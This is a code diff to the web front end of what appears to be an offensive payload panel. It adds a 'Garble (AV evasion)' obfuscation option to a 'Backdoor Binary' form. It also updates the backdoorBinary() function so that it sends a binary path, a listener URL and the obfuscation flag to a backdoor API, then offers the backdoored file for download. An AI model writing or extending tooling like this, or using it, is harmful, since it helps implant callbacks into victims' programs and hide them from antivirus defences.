@@ -920,6 +920,17 @@ tr.clickable { cursor: pointer; }
               <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Output Path (optional)</label>
               <input type="text" id="bd-output" placeholder="auto-generated" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
             </div>
+            <div style="margin-bottom:12px;">
+              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;">Obfuscation</label>
+              <div style="display:flex;gap:8px;">
+                <label style="display:flex;align-items:center;gap:4px;cursor:pointer;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;flex:1;justify-content:center;">
+                  <input type="radio" name="bd-obfuscate" value="none" checked> None
+                </label>
+                <label style="display:flex;align-items:center;gap:4px;cursor:pointer;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;flex:1;justify-content:center;">
+                  <input type="radio" name="bd-obfuscate" value="garble"> <span style="color:#a78bfa;font-weight:600;">Garble</span> (AV evasion)
+                </label>
+              </div>
+            </div>
             <button onclick="backdoorBinary()" class="btn" style="width:100%;padding:12px;font-size:14px">💉 Backdoor Binary</button>
             <div id="bd-result" style="margin-top:10px;font-size:13px"></div>
           </div>
@@ -2737,23 +2748,26 @@ async function backdoorBinary() {
   const input = document.getElementById('bd-input').value.trim();
   const url = document.getElementById('bd-url').value.trim();
   const output = document.getElementById('bd-output').value.trim();
+  const obfuscate = (document.querySelector('input[name="bd-obfuscate"]:checked')||{}).value === 'garble';
   const result = document.getElementById('bd-result');
 
   if (!input || !url) { alert('Input binary path and listener URL are required'); return; }
 
-  result.innerHTML = '<span style="color:var(--yellow)">Backdooring binary...</span>';
+  const label = obfuscate ? 'Backdooring + garbling (this takes a few minutes)...' : 'Backdooring binary...';
+  result.innerHTML = '<span style="color:var(--yellow)">⚙️ '+label+'</span>';
 
   try {
     const resp = await fetch('/api/payload/backdoor/binary', {
       method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({input:input, listener_url:url, output:output||''})
+      body: JSON.stringify({input:input, listener_url:url, output:output||'', obfuscate:obfuscate})
     });
     const data = await resp.json();
     if (data.error) {
       result.innerHTML = '<span style="color:var(--red)">Error: '+data.error+'</span>';
     } else {
-      result.innerHTML = '<span style="color:var(--green)">Backdoored! '+data.filepath+' ('+data.size+')</span>' +
-        '<br><a href="/api/payload/download?file='+encodeURIComponent(data.filepath)+'" style="color:var(--cyan);font-size:12px">Download</a>';
+      const badge = obfuscate ? ' <span style="background:rgba(139,92,246,0.2);color:#a78bfa;padding:1px 7px;border-radius:4px;font-size:10px;font-weight:700;">GARBLED</span>' : '';
+      result.innerHTML = '<span style="color:var(--green)">✓ Backdoored'+badge+' — '+data.filepath+' ('+data.size+')</span>' +
+        '<br><a href="/api/payload/download?file='+encodeURIComponent(data.filepath)+'" style="color:var(--cyan);font-size:12px;text-decoration:none;">⬇ Download</a>';
     }
   } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
 }
